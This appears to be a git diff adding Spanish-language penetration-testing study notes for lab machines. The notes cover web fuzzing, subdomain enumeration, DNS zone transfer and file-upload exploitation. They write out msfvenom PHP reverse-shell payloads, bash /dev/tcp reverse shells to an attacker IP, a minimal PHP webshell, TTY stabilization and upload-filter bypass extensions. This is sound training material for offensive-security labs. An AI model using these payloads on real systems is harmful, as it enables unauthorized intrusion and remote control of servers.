@@ -6,21 +6,201 @@ status: "done"
 
 # 01. Qué es Fuzzing Web - Uso de Gobuster
 
+Descubrir rutas y archivos ocultos en un servidor web.
+
+```bash
+# Rápido con dirb (wordlist por defecto)
+dirb http://<IP víctima>
+
+# Más completo con gobuster — busca rutas y extensiones específicas
+gobuster dir \
+  -u http://<IP víctima>/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
+  -x txt,py,php,sh
+```
+
+> `-x` busca archivos con esas extensiones además de directorios. Útil para encontrar paneles de login, backups o scripts expuestos.
+
+---
+
 # 02. Enumeración de Subdominios con Wfuzz
+
+Algunos servidores tienen subdominios que no aparecen en el fuzzing normal — hay que buscarlos por el header `Host`.
+
+**1. Agregar el dominio al `/etc/hosts`:**
+
+```bash
+sudo nano /etc/hosts
+# Agregar al final:
+<IP víctima>  <dominio>.hmv
+```
+
+**2. Buscar subdominios:**
+
+```bash
+wfuzz -c --hc=404 --hl=1 \
+  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
+  -H "Host: FUZZ.logan.hmv" \
+  -u <IP víctima>
+```
+
+| Flag       | Descripción                                             |
+| ---------- | ------------------------------------------------------- |
+| `--hc=404` | Ocultar respuestas 404                                  |
+| `--hl=1`   | Ocultar respuestas con 1 línea (ajustar según baseline) |
+| `FUZZ`     | Donde wfuzz inyecta cada palabra del diccionario        |
+
+---
 
 # 03. Cómo Hacer un ataque de Transferencia de Zona DNS - Opcional
 
+Si el servidor DNS está mal configurado, puede devolver todos sus registros.
+
+```bash
+# Intentar transferencia de zona
+dig axfr <dominio> @<IP víctima>
+
+# Si obtienes subdominios, enumerarlos con wfuzz
+wfuzz -c --hc=404 --hl=367 \
+  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
+  -H "Host: FUZZ.<dominio>" \
+  -u <IP víctima>
+```
+
+> `axfr` es la solicitud de transferencia de zona — si el servidor responde, obtienes todos los subdominios de golpe.
+
+---
+
 # 04. Otras Herramientas Fuzzing Web - Uso de WFUZZ, DIRB y DIRSEARCH
+
+```bash
+# wfuzz — más flexible, permite filtros avanzados
+wfuzz -c --hc 404 \
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  http://<IP víctima>/FUZZ
+
+# dirb — simple y rápido
+dirb http://<IP víctima>
+
+# dirsearch — muestra resultados limpios con códigos de estado
+dirsearch -u http://<IP víctima>/ \
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+```
+
+---
 
 # 05. Explotación de vulnerabilidades File Upload
 
-# 06. Bypass Restricción de File Upload - PARTE 2
+Si el servidor permite subir archivos, puedes subir una reverse shell.
 
-# 07. Primeros pasos tras la Intrusión (Tratamiento de la TTY)
+**1. Generar el payload PHP:**
 
-# 08. Obtener Intrusión a Servidor Mediante uso de una Webshell
+```bash
+msfvenom -p php/reverse_tcp LHOST=<IP atacante> LPORT=443 -f raw > pwned.php
+```
 
-# 09. Bypass Restricción de File Upload
+**2. Encontrar dónde se subió el archivo:**
+
+```bash
+gobuster dir -u http://<IP víctima>/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+```
+
+**3. Ponerse en escucha:**
+
+```bash
+nc -nlvp 443
+```
+
+**4. Acceder al archivo subido desde el navegador:**
+
+```
+http://<IP víctima>/uploads/pwned.php
+```
+
+**5. Si necesitas estabilizar la shell:**
+
+```bash
+nc -nlvp 4444
+bash -c "sh -i >& /dev/tcp/<IP atacante>/4444 0>&1"
+```
+
+---
+
+# 06. Primeros pasos tras la Intrusión (Tratamiento de la TTY)
+
+Al recibir una reverse shell básica, la terminal es inestable. Estos comandos la convierten en una TTY interactiva.
+
+```bash
+script /dev/null -c bash   # iniciar pseudo-terminal
+# presionar CTRL+Z
+stty raw -echo; fg         # pasar control al proceso
+reset xterm                # resetear terminal
+export TERM=xterm
+export SHELL=bash
+```
+
+> Sin esto no puedes usar `sudo`, editores como `nano/vim` ni autocompletado con Tab.
+
+---
+
+# 07. Obtener Intrusión a Servidor Mediante uso de una Webshell
+
+Una webshell es un archivo PHP mínimo que ejecuta comandos en el servidor.
+
+**Contenido del archivo:**
+
+```php
+<?php
+  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+```
+
+**Usarla desde el navegador:**
+
+```
+http://<IP víctima>/uploads/shell.php?cmd=whoami
+http://<IP víctima>/uploads/shell.php?cmd=id
+```
+
+**Obtener reverse shell desde la webshell vía Burp Suite:**
+
+1. En Burp → **Decoder** → pega el payload y selecciona **Encode as URL**:
+
+```bash
+bash -c "bash -i>&/dev/tcp/<IP atacante>/443 0>&1"
+```
+
+2. Pegar la URL encodeada en el parámetro `cmd`:
+
+```
+http://<IP víctima>/uploads/shell.php?cmd=<payload-url-encodeado>
+```
+
+---
+
+# 08. Bypass Restricción de File Upload
+
+Si el servidor bloquea la extensión `.php`, prueba con extensiones alternativas que el servidor también ejecuta:
+
+```bash
+mv pwned.php pwned.phtml   # equivalente a .php en muchos servidores
+```
+
+Otras extensiones a probar:
+
+| Extensión | Notas                            |
+| --------- | -------------------------------- |
+| `.phtml`  | Más común, casi siempre funciona |
+| `.php5`   | Servidores con PHP5              |
+| `.phar`   | PHP Archive                      |
+| `.shtml`  | Server-side includes             |
+
+> Si ninguna funciona, intenta cambiar el `Content-Type` en Burp Suite a `image/jpeg` mientras subes el `.php`.
+
+# 09. Bypass Restricción de File Upload - PARTE 2
+
+gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,html,txt
 
 # 10. Burp Suite - Modificar Peticiones HTTP
 
